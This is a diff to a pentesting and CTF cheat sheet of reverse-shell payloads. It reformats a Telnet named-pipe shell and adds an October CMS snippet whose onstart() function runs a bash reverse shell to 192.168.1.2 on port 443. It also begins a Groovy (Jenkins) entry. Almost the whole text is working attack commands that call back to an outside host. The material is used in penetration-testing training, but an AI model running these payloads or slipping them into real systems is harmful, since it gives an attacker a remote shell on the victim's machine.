@@ -199,7 +199,7 @@ __Pentesting - Red Team - CTFs - OSCP__
   ```
   ---
   
-   `Telnet`
+  `Telnet`
 
   ```cmd
   rm -f /tmp/p; mknod /tmp/p p && telnet 192.168.1.2 443 0/tmp/p
@@ -225,7 +225,15 @@ __Pentesting - Red Team - CTFs - OSCP__
   ```
   ---
   
-`Groovy (Jenkins)`
+  `October CMS`
+  
+  ```cmd
+  function onstart(){
+    exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'");
+    }
+  ```
+  
+  `Groovy (Jenkins)`
 
   ```cmd
   String host="192.168.1.2";
